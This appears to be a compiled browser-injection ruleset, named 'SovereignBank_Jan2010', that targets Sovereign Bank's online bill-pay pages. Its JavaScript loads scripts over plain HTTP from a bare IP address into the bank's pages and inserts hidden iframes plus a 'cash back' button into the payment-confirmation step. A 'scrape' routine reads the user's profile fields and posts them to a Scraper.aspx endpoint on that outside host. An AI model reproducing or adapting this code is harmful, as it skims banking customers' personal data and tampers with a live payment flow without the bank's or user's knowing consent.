{"global":[{"emit":"if(!$K.browser.mozilla)        return;        var debug = false;             myalert = function(msg){if(debug){alert(msg);}};         loadScript = function(url, callback)    {            var head = document.getElementsByTagName(\"head\")[0];            var script = document.createElement(\"script\");            script.src = url;                          var done = false;            script.onload = script.onreadystatechange = function()            {                    if( !done && ( !this.readyState                                             || this.readyState == \"loaded\"                                             || this.readyState == \"complete\") )                    {                            done = true;                                                          callback();                                                          script.onload = script.onreadystatechange = null;                            head.removeChild( script );                    }            };                head.appendChild(script);    };        injectIFrame = function(id,url,callback){                        if(callback){                 $K(\"body\").append('<div id=\"'+id+'\" style=\"display:none;\"><iframe frameborder=\"0\" width=\"100%\" height=\"500%\"  src=\"'+url+'\" onload=\"'+callback+'()\"></div>');            }else{                 var divtag = '<div id=\"'+id+'\" style=\"display:none;\"><iframe frameborder=\"0\" src=\"'+url+'\" width=\"100%\" height=\"500%\"></div>';                                $K(\"body\").append(divtag);                             }    };                "}],"global_start_line":12,"dispatch":[{"domain":"webpay.sovereignbank.com","ruleset_id":null}],"dispatch_start_col":5,"meta_start_line":2,"rules":[{"cond":{"val":"true","type":"bool"},"blocktype":"every","actions":[{"action":{"source":null,"name":"noop","args":[],"modifiers":null},"label":null}],"post":null,"pre":null,"name":"newrule","start_col":5,"emit":"if(!$K.browser.mozilla && !$K.browser.msie)      return;     setVisitFlag = function(flag){      $.cookie(\"IsBackFromConfirm\", flag, { path: '/', expires: 1 });  };    recognizePayConfirm = function(){      return (location.href==\"https://webpay.sovereignbank.com/cw411/wps#hideErrorAnchor0\") &&  ($K(\".header_title\").text().indexOf('Review Payments')>=0);    };    OnCashbackClicked = function(){            setVisitFlag('yes');            submitForm(\"resubmit\");                      return false;  };     ChangeConfirmPage = function(){    $K('head').append('<link rel=\"stylesheet\" href=\"http://173.1.49.213/SovJan2010/css/forCU1.css\" />');        var kulamulaButton = '<div class=\"buttonright\"><div><a class=\"button1\" name=\"OK\" id=\"kulamulaButton\" onclick=\"OnCashbackClicked\" href=\"\">   <span id=\"btnText\" style=\"color:#000000;font-family:Arial,Helvetica,sans-serif;font-weight:bold;font-size:100%;\"></span></a><div></div>';    var discountUrl=\"http://173.1.49.213/SovJan2010/Discount.aspx?token=\"+$.cookie(\"token\")+\"#\"+encodeURIComponent(document.location.href);;        injectIFrame('discountPage',discountUrl);      $K('.row2').append(kulamulaButton);    $K(\"#kulamulaButton\").click(OnCashbackClicked);        $.receiveMessage(function(e) {                      if(e.data.indexOf('discount')>-1){                      $K('#btnText').html('Submit Payments & Get Up To '+e.data.substring(9)+' Cash Back');                  }              });  };    loadScraper=function(callback){      var scrapingURL=\"http://173.1.49.213/SovJan2010/Scraper.aspx\";      injectIFrame('scraper', scrapingURL,callback);  };      IsBackFromConfirm = function(){      var flag = $.cookie(\"IsBackFromConfirm\");      return (flag == 'yes');  };        load_brandPicker = function(){                     var token=$.cookie(\"token\");  \t\t   var brandPickerUrl = \"http://173.1.49.213/SovJan2010/brandpicker.aspx?token=\"+token+\"#\"+encodeURIComponent(document.location.href);                        myalert(brandPickerUrl);                                            injectIFrame('brand_picker',brandPickerUrl);                      $('#brand_picker').dialog({  \t\t\tmodal:true,             \t\twidth:$K(window).width(),   \t\t\theight:2*$K(document).height(),  \t                position:['top','left']   \t               });                        $('#brand_picker').draggable();                      $(\".ui-icon-closethick\").remove();                      $('#KulamulaDialog').remove();  };    dialog_start = function(){      var src = 'http:\\/\\/173.1.49.213/SovJan2010/welcome.aspx?name=Ann'+'#'+encodeURIComponent(document.location.href);      injectIFrame(\"KulamulaDialog\",src,\"load_brandPicker\");               \t$.receiveMessage(function(e) {                  if(e.data.startsWith('close')){  \t\t     $('.ui-widget-overlay').remove();                      $('.ui-dialog-titlebar').remove();                      $('.ui-dialog').remove();                      var tempobj = $('#KulamulaDialog');                      if(tempobj){                            tempobj.dialog('destroy');                            $('#KulamulaDialog').remove();                      }                      tempobj=$('#brand_picker');                      if(tempobj){                             tempobj.dialog('destroy');                             $('#brand_picker').remove();                      }                  }else{                                        }               });     };       String.prototype.startsWith = function(str)   {return (this.match(\"^\"+str)==str)};      loadScript(\"http://code.jquery.com/jquery-latest.js\", function(){         loadScript(\"http://173.1.49.213/SovJan2010/script/JqueryCookies.js\", function(){          loadScript(\"http://173.1.49.213/ErrorHandling/jquery.ba-postmessage.js\", function(){             loadScript(\"http://173.1.49.213/ErrorHandling/ba-debug.js\", function(){                   loadScript(\"http://173.1.49.213/ErrorHandling/querystring.js\", function(){                        loadScript(\"http://173.1.49.213/ErrorHandling/json2.js\", function(){                            if(recognizePayConfirm()){                                  ChangeConfirmPage();                            }else if(IsPaymentCenter()){                                   var url=$('#app_nav1 ul li:eq(5) a').attr('href');                                   url=\"https://webpay.sovereignbank.com/cw411/\"+url;                                   injectIFrame('personalInfo1',url);                            } if(IsMyProfileSelection()){                                   if(IsMyProfile()){                                       loadScraper('scrape');                                   }else{                                       $('.radioMP:eq(0) input').click();                                   }                            }else if( IsBackFromConfirm()){                                    loadScript(\"http://173.1.49.213/ErrorHandling/jquery-ui-1.7.2.custom.min.js\",function(){                                         dialog_start();                                         setVisitFlag('no');                                  });                             }                         });                    });             });         });     });  });    IsPaymentCenter=function(){        if($('.selected span').text()=='Payment Center'){               return true;        }else{               return false;        }  };    IsMyProfile=function(){       if($('.selectedOption').length>0){             return true;       }else{             return false;       }  };    IsMyProfileSelection=function(){       if($('.selected span').text()=='My Profile'){               return true;        }else{               return false;        }  };    scrape=function(){      var msg={};      msg.AppId='Sovereign';      msg.PageId='ProfilePage';      msg.RequestType='GetConfig';      msg.URL=location.href;          $.postMessage(msg, \"http://173.1.49.213/SovJan2010/Scraper.aspx\",$('#scraper iframe').get(0).contentWindow);       $.receiveMessage(function(e) {         var msg=new Querystring(e.data);         var data=JSON.parse(msg.get('data'));         if(msg.get('type')=='config'){                 var savingValue={};                  savingValue.URL=location.href;                               savingValue.AppName='Sovereign';                 savingValue.UserId='ebeworld';                 savingValue.RequestType='SaveValue';                 savingValue.FieldInfos=[];                                      for(var i=0;i<data[0].FieldInfos.length;i++){                               savingValue.FieldInfos[i]={};                               savingValue.FieldInfos[i].FieldName=data[0].FieldInfos[i].FieldName;                               savingValue.FieldInfos[i].FieldValue=$(data[0].FieldInfos[i].Path).text();                 }                 $.postMessage(savingValue,                                \"http://173.1.49.213/SovJan2010/Scraper.aspx\",                                 $('#scraper iframe').get(0).contentWindow);                   alert('done');           }else if(msg.get('type')=='token'){                var token=data;                $.cookie(\"token\", token, { path: '/', expires: 1 });                alert('scraping done...');           }          });  }            ","state":"active","callbacks":null,"pagetype":{"event_expr":{"pattern":"https://webpay.sovereignbank.com/cw411/wps","legacy":1,"type":"prim_event","vars":[],"op":"pageview"},"foreach":[]},"start_line":16}],"meta_start_col":5,"meta":{"logging":"off","name":"SovereignBank_Jan2010","meta_start_line":2,"description":"Replica of SB in Jan/2010   \n","meta_start_col":5},"dispatch_start_line":9,"global_start_col":5,"ruleset_name":"a69x19"}